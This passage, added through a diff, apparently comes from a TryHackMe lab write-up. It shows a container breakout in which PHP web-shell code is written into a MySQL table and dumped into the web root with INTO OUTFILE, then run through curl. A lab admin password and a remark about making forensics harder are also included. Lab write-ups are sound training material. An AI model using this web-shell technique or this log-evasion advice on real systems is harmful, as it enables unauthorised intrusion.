@@ -35,3 +35,64 @@ Example usage: `curl 127.0.0.1:8080/shell.php?cmd=whoami`
 
 ---
 # Your job
+
+## Break out the container
+
+The key to breaking out here is the fact we have access to that DB. The access we have permits us to write to the database, then we can call our written table enteries.
+The following commands are run on the victim machine.
+### Access the remote database using administrator credentials
+
+`mysql -u admin -p -h 192.168.100.1`
+
+Password: `!123SecureAdminDashboard321!`
+
+### Create a new table in the main database
+
+Create a table in the `DashboardDB` database.
+
+- Select the database.
+	mysql> `use DashboardDB;`
+
+- Create a table.
+	You also need a column which allow a lot of characters, so use varchar (variable characters) with a length of 255.
+	
+	mysql> `CREATE TABLE hax(Code varchar(255));`
+
+- Inject PHP code to gain command execution.
+	To add the code in, we can escape the special characters.
+	To escape the characters, we need to add a `“\”` before the special characters that are being entered, resulting in the SQL statement being:
+	
+	mysql> `INSERT INTO hax (Code) value ('<?php $cmd=$_GET[\"cmd\"]\;system($cmd)\;?>');`
+
+- Check the code.
+	mysql> `SELECT * FROM hax;`
+	![[Task 18 - Making Thin Lizzy Proud-20240917135834697.webp]]
+
+### Drop table contents onto a file
+
+- Drop table contents onto a file the user can access.
+	You can only save the  file in `/var/www/html`.
+	
+	mysql> `SELECT * FROM hax INTO OUTFILE /var/www/html/hax.php';`
+
+### Accessing 192.168.100.1 machine
+
+- Execute and obtain RCE on the host.
+	You can’t view the website via a browser, as you still don’t have a proxy through this box and you only have command line access. So instead you need to use `curl`.
+	
+	www-data@f988aa7b2fb3:/var/www/html$ `curl 192.168.100.1:8080/hax.php?cmd=whoami`
+	
+	![[Task 18 - Making Thin Lizzy Proud-20240917142609190.webp]]
+
+- Check that you are talking to a different machine.
+	www-data@f988aa7b2fb3:/var/www/html$ `hostname`
+	![[Task 18 - Making Thin Lizzy Proud-20240917143015435.webp]]
+	
+	www-data@69cd1465ecc9:/var/www/admin$ `curl 192.168.100.1:8080/hax.php?cmd=hostname`
+	![[Task 18 - Making Thin Lizzy Proud-20240917143142963.webp]]
+
+
+> It should be noted, that the one liner provided by TryHackMe is actually a much better solution as it doesn’t write anything to the database, and therefore will be less logs and if the outfile is removed at the end of the engagement, any forensics might be slightly more difficult (although the command should still show in the MySQL logs!)
+>  How does that one liner work? Well basically it just skips writing anything to the table, instead it selects the PHP code and directs it straight into a file.
+
+**Next step:** [[Task 19 - Going%20out%20with%20a%20SHEBANG%21]]
